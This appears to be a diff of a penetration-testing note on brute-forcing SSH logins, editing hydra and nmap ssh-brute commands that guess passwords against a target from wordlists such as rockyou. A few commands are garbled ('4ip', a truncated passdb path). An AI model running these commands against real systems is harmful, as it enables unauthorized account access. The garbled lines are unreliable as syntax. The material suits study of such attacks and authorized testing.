@@ -20,15 +20,21 @@ You can run the normal attack with users and passwords wordlists too.
 
 \`hydra -L /usr/share/`metasploit-framework/data/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt $ip ssh` - specified users and password wordlists.
 
+#### nmap nselib wordlist
+
+`/usr/share/nmap/nselib/data/passwords.lst` .
+
 ## Bruteforce with \[nmap] utility
 
+{% code overflow="wrap" %}
 ```bash
 # you might want to check for specific users like: "root", "admin" or "administrator"
 # so you can save them to a file as "user" wordlist file.
 echo "administrator" > user
 # "/root" is the path the "user" file is stored
-nmap 4ip -p22 --script ssh-brute --script-args userdb=/root/user
+nmap 4ip -p22 --script ssh-brute --script-args userdb=/root/user,passdb=/usr/share.... $ip
 ```
+{% endcode %}
 
 ## Bruteforce with \[msfconsole] Metasploit
 
